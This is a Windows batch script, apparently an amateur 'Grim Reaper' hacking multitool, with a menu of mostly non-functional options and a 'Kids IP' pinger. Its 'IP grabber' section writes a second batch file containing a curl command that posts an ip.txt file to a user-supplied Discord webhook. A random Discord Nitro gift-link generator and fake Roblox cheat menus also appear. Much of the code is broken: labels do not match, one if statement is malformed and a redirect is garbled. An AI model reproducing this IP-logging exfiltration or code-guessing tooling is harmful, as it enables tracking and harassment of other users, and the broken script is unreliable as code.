@echo off
title Grim Reaper V1  -  by  jimisweg1971
chcp 65001 >nul
color 1

@echo off
color 1
title password to Grim Reaper v1

:top
cls
set /p input= [username]
if %input%==the-dead goto pass
if not %input%==the-dead goto wronguser


:pass
set /p input= [password]
if %input%==v1 goto menu
if not %input%==v1 goto wrongpass

:wronguser
echo wrong user
Pause
goto top


:wrongpass
echo wrong pass
Pause
goto pass




:passmenu

echo.
echo type 1 to goto pinger   
set /p input= option:
if %input%==1 goto pinger                                                                   


:thedead

goto menu


:menu

echo. ██████╗ ██████╗ ██╗███╗   ███╗    ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗     ██╗   ██╗ ██╗
echo.██╔════╝ ██╔══██╗██║████╗ ████║    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗    ██║   ██║███║
echo.██║  ███╗██████╔╝██║██╔████╔██║    ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝    ██║   ██║╚██║
echo.██║   ██║██╔══██╗██║██║╚██╔╝██║    ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ██║
echo.╚██████╔╝██║  ██║██║██║ ╚═╝ ██║    ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║     ╚████╔╝  ██║
echo. ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═╝
                                                                                                    




echo.┌────────────────────────────────────────────────────────────────────────────────────────────────┐
echo.│  [1] Ip Pinger                                                                       [K] credit│
echo.│  [2] Password-Cracker                                                               [U] youtube│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [3] ip Lookup                                                                                 │
echo.│  [4] Bot-net                                                                                   │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [5] Ip grabber                                                                                │
echo.│  [6] MultiTool v1                                                                              │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [7] MultiTool v2                                                                              │
echo.│  [8] nitro gen                                                                                 │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [9] Passwordgen                                                                               │
echo.│  [10] roblox executue                                                                          │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [11] ip Generate                                                                              │
echo.│  [12] number Generate                                                                          │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [13] Number guessing game                                                                     │
echo.│  [14] Minecraft game                                                                           │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [15] fortnite game                                                                            │
echo.│  [16] GTA5 Game                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [17] phone Number Generate                                                                    │
echo.│  [18] Number guessing game v2                                                         [X] EXIST│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.└────────────────────────────────────────────────────────────────────────────────────────────────┘

set /p input=">>"
if %input% EQU 1 goto IPPinger 
if %input% EQU 2 goto Password-Cracker 
if %input% EQU 3 goto Ip-Geo-Lookup 
if %input% EQU 4 goto Botnetv1
if %input% EQU x goto exist
if %input% EQU k msg * credit to ebola man  -  credit to Wock Codes  -  credit to n.x.s.x  -  credit to blurr  - good bye
if %input% EQU 5 goto IPgrabber
if %input% EQU 6 goto multi-tool-V1
if %input% EQU 7 goto Multi-Tool-V2
if %input% EQU 8 goto nitro-gen
if %input% EQU U start https://www.youtube.com/@jimisweg1971
if %input% EQU 9 goto passwordgen
if %input% EQU Devmode goto Devmode
if %input% EQU 10 goto roblox-executue
if %input% EQU 11 goto ipgen
if %input% EQU 12 goto numbergen
if %input% EQU 13 goto Number-guessing
if %input% EQU 14 goto Minecraft-game
if %input% EQU 15 goto fortnitegame
if %input% EQU 16 goto gta5game
if %input% EQU 17 goto phoneNumber
if %input% EQU 18 goto Number-guessingv2


:IPPinger



@echo off
title IP Pinger  -  by jimisweg1971
color 4
chcp 65001 >nul

echo.    ██▓ ██▓███      ██▓███   ██▓ ███▄    █   ▄████ ▓█████  ██▀███  
echo.   ▓██▒▓██░  ██▒   ▓██░  ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
echo.   ▒██▒▓██░ ██▓▒   ▓██░ ██▓▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
echo.   ░██░▒██▄█▓▒ ▒   ▒██▄█▓▒ ▒░██░▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
echo.   ░██░▒██▒ ░  ░   ▒██▒ ░  ░░██░▒██░   ▓██░░▒▓███▀▒░▒████▒░██▓ ▒██▒
echo.   ░▓  ▒▓▒░ ░  ░   ▒▓▒░ ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
echo.    ▒ ░░▒ ░        ░▒ ░      ▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
echo.    ▒ ░░░          ░░        ▒ ░   ░   ░ ░ ░ ░   ░    ░     ░░   ░ 
echo.    ░                        ░           ░       ░    ░  ░   ░     
echo.

:rainbow
set /p IP=Enter Kids IP::ping
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul

set /p IP=Enter Kids IP::ping
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul

color a
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 02
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 03
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 04
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 05
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 06
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 07
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 08
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 09
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0a
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0b
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 0c
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...) 
ping -t 2 0 10 127.0.0.1 >nul
color 0d
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0e
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
color 0f
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo offline...)
ping -t 2 0 10 127.0.0.1 >nul
goto rainbow

Pause









:Password-Cracker

@echo off
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

for /f %%a in (%wordlist%) do (
 echo %%a
 )
 
 
 
:Ip-Geo-Lookup

@echo off
chcp 65001 >nul
title Ip Lookup  -  by  jimisweg1971
color 4

:Ip-Lookup
echo.    ██▓ ██▓███      ██▓     ▒█████   ▒█████   ██ ▄█▀ █    ██  ██▓███      ██▒   █▓ ██▓
echo.   ▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒▒██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒   ▓██░   █▒▓██▒
echo.   ▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒    ▓██  █▒░▒██▒
echo.   ░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░▒██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒     ▒██ █░░░██░
echo.   ░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░ ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░      ▒▀█░  ░██░
echo.   ░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░      ░ ▐░  ░▓  
echo.    ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░           ░ ░░   ▒ ░
echo.    ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░               ░░   ▒ ░
echo.   ░                  ░  ░    ░ ░      ░ ░  ░  ░      ░                       ░   ░  
echo.=====================================================================================
echo Enter An IP address to lookup
set /p ip=
if "%ip%"=="back" goto menu

curl "https://ipinfo.io/%ip%/json" -o geolocation.json
echo =========================================================================================================================
echo IP Geolocation for &`%ip%:
type geolocation.json
del geolocation.json
echo =========================================================================================================================
pause
goto ip_geo_lookup

Pause

:end




:Botnetv1

@echo off 
cls
chcp 65001 >nul
title botnet - by jimisweg1971
color 1


cls
echo.  ██████╗  ██████╗ ████████╗    ███╗   ██╗███████╗████████╗    ██╗   ██╗ ██╗
echo.  ██╔══██╗██╔═══██╗╚══██╔══╝    ████╗  ██║██╔════╝╚══██╔══╝    ██║   ██║███║
echo.  ██████╔╝██║   ██║   ██║       ██╔██╗ ██║█████╗     ██║       ██║   ██║╚██║
echo.  ██╔══██╗██║   ██║   ██║       ██║╚██╗██║██╔══╝     ██║       ╚██╗ ██╔╝ ██║
echo.  ██████╔╝╚██████╔╝   ██║       ██║ ╚████║███████╗   ██║        ╚████╔╝  ██║
echo.  ╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═══╝╚══════╝   ╚═╝         ╚═══╝   ╚═╝
echo.


echo.╔════════════════════════════════════════════════╗                                                                            
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.║                                                ║
echo.╚════════════════════════════════════════════════╝
set /p "choice="Choose an  option (1-3):"

if "%choice%"=="1" goto github
if "%choice%"=="2" goto destroy_webhook
if "%choice%"=="3" webhook_spammer
echo invaild choice, try again
pause
goto menu

:Github
cls
echo opeming my github

Pause





:IPgrabber
@echo off
chcp 65001 >nul
title Ip grabber  -  by jimisweg1971
color 2


echo.██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ███████╗██████╗ 
echo.██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo.██║██████╔╝    ██║  ███╗██████╔╝███████║██████╔╝█████╗  ██████╔╝
echo.██║██╔═══╝     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══╝  ██╔══██╗
echo.██║██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║  ██║
echo.╚═╝╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

set /p choice=!

if "%choice%"=="1" goto grabber

:Grabber
cls
echo.██╗███╗   ██╗███████╗ ██████╗     ██╗██████╗      ██████╗ ██████╗  █████╗ ██████╗ ███████╗██████╗ 
echo.██║████╗  ██║██╔════╝██╔═══██╗    ██║██╔══██╗    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
echo.██║██╔██╗ ██║█████╗  ██║   ██║    ██║██████╔╝    ██║  ███╗██████╔╝███████║██████╔╝█████╗  ██████╔╝
echo.██║██║╚██╗██║██╔══╝  ██║   ██║    ██║██╔═══╝     ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══╝  ██╔══██╗
echo.██║██║ ╚████║██║     ╚██████╔╝    ██║██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝███████╗██║  ██║
echo.╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝     ╚═╝╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
set /p "webhook=Enter your discord webhook:"

if "%webhook%"--" (
    echo discord webhook URL is required.
	pause
	goto menu
	
	

echo Connection (true) Making Ip logger script/
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -f 1=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^ip.txt >> ip_grabber_exec.bat

echo Ip grabber script has been created as ip_grabber_exec.bat.
pause
goto menu

Pause






:multi-tool-V1
@echo off
chcp 65001 >nul
color 4
title MultiTool  -  by  jimisweg1971


:menu
echo.

echo. ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓   ▄▄▄█████▓ ▒█████   ▒█████   ██▓        ██▒   █▓ ██▓
echo.▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒       ▓██░   █▒▓██▒
echo.▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░        ▓██  █▒░▒██▒
echo.▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░         ▒██ █░░░██░
echo.▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒      ▒▀█░  ░██░
echo.░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓       ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░      ░ ▐░  ░▓  
echo.░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░      ░ ░░   ▒ ░
echo.░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░     ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░           ░░   ▒ ░
echo.      ░      ░         ░  ░        ░                  ░ ░      ░ ░      ░  ░         ░   ░  
echo welcome to MultiTool v1
====================================================================================================
echo 1) Pinger
echo 2) Password-Cracker
echo 3) Ip Geo Lookup
echo 4) MultiTool v2
echo 5) Exit
====================================================================================================
set /p input=">>"
if %input% EQU 1 start Pinger.bat
if %input% EQU 2 start Password-Cracker
if %input% EQU 3 start Ip-Geo-Lookup
if %input% EQU 4 start Multi-Tool-V2
if %input% EQU 5 goto end

Pause













:Multi-Tool-V2

@echo off
chcp 65001 >nul
color 1
title MultiTool v2  -  by  jimisweg1971

:menu

echo.███╗   ███╗██╗   ██╗██╗  ████████╗██╗    ████████╗ ██████╗  ██████╗ ██╗         ██╗   ██╗██████╗ 
echo.████╗ ████║██║   ██║██║  ╚══██╔══╝██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║         ██║   ██║╚════██╗
echo.██╔████╔██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║         ██║   ██║ █████╔╝
echo.██║╚██╔╝██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║         ╚██╗ ██╔╝██╔═══╝ 
echo.██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║       ██║   ╚██████╔╝╚██████╔╝███████╗     ╚████╔╝ ███████╗
echo.╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝      ╚═══╝  ╚══════╝
echo.welcome to MultiTool v2






echo.╔════════════════════════════════════════════════╗                                                                            
echo.║   [1] Ip Pinger                                ║
echo.║------------------------------------------------║
echo.║   [2] Password-Cracker                         ║
echo.║------------------------------------------------║
echo.║   [3] Ip Lookup                                ║
echo.║------------------------------------------------║
echo.║   [4] Bot-net                                  ║
echo.║------------------------------------------------║
echo.║   [5] Exist                                    ║
echo.║------------------------------------------------║
echo.║   [6] credit                                   ║
echo.╚════════════════════════════════════════════════╝

set /p input=">>"
if %input% EQU 1 start Pinger.bat
if %input% EQU 2 start Password-Cracker
if %input% EQU 3 start Ip-Geo-Lookup
if %input% EQU 4 start Bot-net.bat
if %input% EQU 5 goto end
if %input% EQU 6 msg * credit to ebola man  -  credit to Wock Codes  -  credit to n.x.s.x  -  credit to blurr  - good bye

Pause









:nitro-gen

@echo off
title nitro gen  -  by jimisweg1971
chcp 65001 >nul
color D

:menu

echo.    ███╗   ██╗██╗████████╗██████╗  ██████╗      ██████╗ ███████╗███╗   ██╗
echo.    ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║
echo.    ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║
echo.    ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║
echo.    ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║
echo.    ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝
echo.   hallo uesr

echo.┌────────────────────────────────────────────────────┐
echo.│                                                    │
echo.│          [1]  Discord Nitro Codes                  │
echo.│                                                    │
echo.│                                                    │
echo.│────────────────────────────────────────────────────│
echo.│                                                    │
echo.│                                                    │
echo.│                  [2] EXIST                         │
echo.│                                                    │
echo.│                                                    │
echo.└────────────────────────────────────────────────────┘


set /p choice=Enter your choice: 

if "%choice%"=="1" goto generate_nitro_codes
if "%choice%"=="2" goto exit

:generate_nitro_codes
cls
echo Generating Discord Nitro Codes...

setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "num_codes=10"
set "code_length=16"

for /l %%i in (1,1,%num_codes%) do (
    set "code="
    for /l %%j in (1,1,%code_length%) do (
        set /a "rand=!random! %% 36"
        for %%k in (!rand!) do (
            set "code=!code!!characters:~%%k,1!"
        )
    )
    echo https://discord.gift/!code!
)

endlocal












































































echo hallo uesr
echo 1. Generate Discord Nitro Codes
echo 2. Exit

set /p choice=Enter your choice:

Pause












:passwordgen
@echo off
setlocal EnableDelayedExpansion
set aplha=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
For /L %%j in (1,1,12) Do Call :GEN
echo Your Random Password is [%PASSWORD%]
pause
EndLocal
GoTo :EOF
:GEN
if %random% gtr 10000 (
set PASSWORD=%PASSWORD%%random:~0,1%
) else (
set /a i=%random:~1,1%+%random:~1,1%
if !i! gtr 25 set i=25
set PASSWORD=%PASSWORD%!aplha:~%i%,1!
)
GoTO :EOF 






























:Devmode
title Grim Reaper v1 devmode
chcp 65001 >nul
color 0a

:Devmodemenu
cls
echo.▓█████▄ ▓█████ ██▒   █▓    ███▄ ▄███▓ ▒█████  ▓█████▄ ▓█████ 
echo.▒██▀ ██▌▓█   ▀▓██░   █▒   ▓██▒▀█▀ ██▒▒██▒  ██▒▒██▀ ██▌▓█   ▀ 
echo.░██   █▌▒███   ▓██  █▒░   ▓██    ▓██░▒██░  ██▒░██   █▌▒███   
echo.░▓█▄   ▌▒▓█  ▄  ▒██ █░░   ▒██    ▒██ ▒██   ██░░▓█▄   ▌▒▓█  ▄ 
echo.░▒████▓ ░▒████▒  ▒▀█░     ▒██▒   ░██▒░ ████▓▒░░▒████▓ ░▒████▒
echo. ▒▒▓  ▒ ░░ ▒░ ░  ░ ▐░     ░ ▒░   ░  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░
echo. ░ ▒  ▒  ░ ░  ░  ░ ░░     ░  ░      ░  ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░
echo.░ ░  ░    ░       ░░     ░      ░   ░ ░ ░ ▒   ░ ░  ░    ░   
echo.   ░       ░  ░     ░            ░       ░ ░     ░       ░  ░
echo. ░                 ░                           ░             
echo.welcome to Grim Reaper v1 devmode








echo.┌────────────────────────────────────────────────────────────────────────────────────────────────┐
echo.│  [1] Ip Pinger                                                                       [K] credit│
echo.│  [2] Password-Cracker                                                               [U] youtube│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [3] ip Lookup                                                                                 │
echo.│  [4] Bot-net                                                                                   │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [5] Ip grabber                                                                                │
echo.│  [6] MultiTool v1                                                                              │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [7] MultiTool v2                                                                              │
echo.│  [8] nitro gen                                                                                 │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [9] Passwordgen                                                                               │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                             [help] Devmode-help│
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                               [off] devmode off│
echo.│                                                                                       [X] EXIST│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.└────────────────────────────────────────────────────────────────────────────────────────────────┘




set /p input=">>"
if %input% EQU 1 goto IPPinger 
if %input% EQU 2 goto Password-Cracker 
if %input% EQU 3 goto Ip-Geo-Lookup 
if %input% EQU 4 goto Botnetv1
if %input% EQU x goto exist
if %input% EQU k msg * credit to ebola man  -  credit to Wock Codes  -  credit to n.x.s.x  -  credit to blurr  - good bye
if %input% EQU 5 goto IPgrabber
if %input% EQU 6 goto multi-tool-V1
if %input% EQU 7 goto Multi-Tool-V2
if %input% EQU 8 goto nitro-gen
if %input% EQU U start https://www.youtube.com/@jimisweg1971
if %input% EQU off goto menu
if %input% EQU help msg * [fixde and adding soon]
if %input% EQU 9 goto passwordgen
if %input% EQU Christmasmode goto Christmasmode






:roblox-executue
@echo off
title roblox executor  -  by  jimisweg1971
chcp 65001 >nul
color D


:menu

echo.███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
echo.██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
echo.█████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
echo.██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
echo.███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
echo.╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝



echo.┌────────────────────────────────────────────────────────────────────────────────────────────────┐
echo.│  [1] Aimbot                                                                          [K] credit│
echo.│  [2] Fly                                                                            [U] youtube│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [3] free roblux                                                                               │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                                │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│                                                                                                │
echo.│                                                                                       [X] EXIST│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.└────────────────────────────────────────────────────────────────────────────────────────────────┘



set /p input=">>"
if %input% EQU 1 goto Aimbotmenu
if %input% EQU 2 goto Fly
if %input% EQU 3 goto free-roblux


















:Aimbotmenu
@echo off
title Aimbotmenu
chcp 65001 >nul
color D


:Aimbotmenu2
echo. █████╗ ██╗███╗   ███╗██████╗  ██████╗ ████████╗
echo.██╔══██╗██║████╗ ████║██╔══██╗██╔═══██╗╚══██╔══╝
echo.███████║██║██╔████╔██║██████╔╝██║   ██║   ██║   
echo.██╔══██║██║██║╚██╔╝██║██╔══██╗██║   ██║   ██║   
echo.██║  ██║██║██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   
echo.╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   


echo.1 to executue Aimbot


set /p "Aimbot=Enter >>:"
msg * executueing Aimbot...
msg * cant executue Aimbot new roblox update...
exit






















:Fly
@echo off
title Flymenu
chcp 65001 >nul
color D


:Flymenu

echo.███████╗██╗  ██╗   ██╗
echo.██╔════╝██║  ╚██╗ ██╔╝
echo.█████╗  ██║   ╚████╔╝ 
echo.██╔══╝  ██║    ╚██╔╝  
echo.██║     ███████╗██║   
echo.╚═╝     ╚══════╝╚═╝   
                        
                        


echo.1 to executue Fly


set /p "Fly=Enter >>:"
msg * executueing Fly...
msg * cant executue Fly new roblox update...
exit
























:free-roblux
@echo off
title Aimbotmenu
chcp 65001 >nul
color D


:free-roblux-menu

echo.███████╗██████╗ ███████╗███████╗    ██████╗  ██████╗ ██████╗ ██╗     ██╗   ██╗██╗  ██╗
echo.██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗██║     ██║   ██║╚██╗██╔╝
echo.█████╗  ██████╔╝█████╗  █████╗      ██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ 
echo.██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ 
echo.██║     ██║  ██║███████╗███████╗    ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗
echo.╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝
                                                                                      


echo.1 to executue free roblux


set /p "freeroblux=Enter >>:"
msg * executueing free roblux...
msg * cant executue free roblux new roblox update...





















































































:Christmasmode
title Grim Reaper v1 Christmasmode
chcp 65001 >nul
color F

:Christmasmodemenu
cls
echo. ██████╗██╗  ██╗██████╗ ██╗███████╗████████╗███╗   ███╗ █████╗ ███████╗███╗   ███╗ ██████╗ ██████╗ ███████╗
echo.██╔════╝██║  ██║██╔══██╗██║██╔════╝╚══██╔══╝████╗ ████║██╔══██╗██╔════╝████╗ ████║██╔═══██╗██╔══██╗██╔════╝
echo.██║     ███████║██████╔╝██║███████╗   ██║   ██╔████╔██║███████║███████╗██╔████╔██║██║   ██║██║  ██║█████╗  
echo.██║     ██╔══██║██╔══██╗██║╚════██║   ██║   ██║╚██╔╝██║██╔══██║╚════██║██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  
echo.╚██████╗██║  ██║██║  ██║██║███████║   ██║   ██║ ╚═╝ ██║██║  ██║███████║██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
echo. ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝   ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
echo.welcome to Grim Reaper v1 Christmasmode




echo.┌────────────────────────────────────────────────────────────────────────────────────────────────┐
echo.│  [1] Ip Pinger                                                                       [K] credit│
echo.│  [2] Password-Cracker                                                               [U] youtube│
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [3] ip Lookup                                                                                 │
echo.│  [4] Bot-net                                                                                   │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [5] Ip grabber                                                                                │
echo.│  [6] MultiTool v1                                                                              │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [7] MultiTool v2                                                                              │
echo.│  [8] nitro gen                                                                                 │
echo.│────────────────────────────────────────────────────────────────────────────────────────────────│
echo.│  [9] Passwordgen                                                                               │
echo.│                                                                                                │
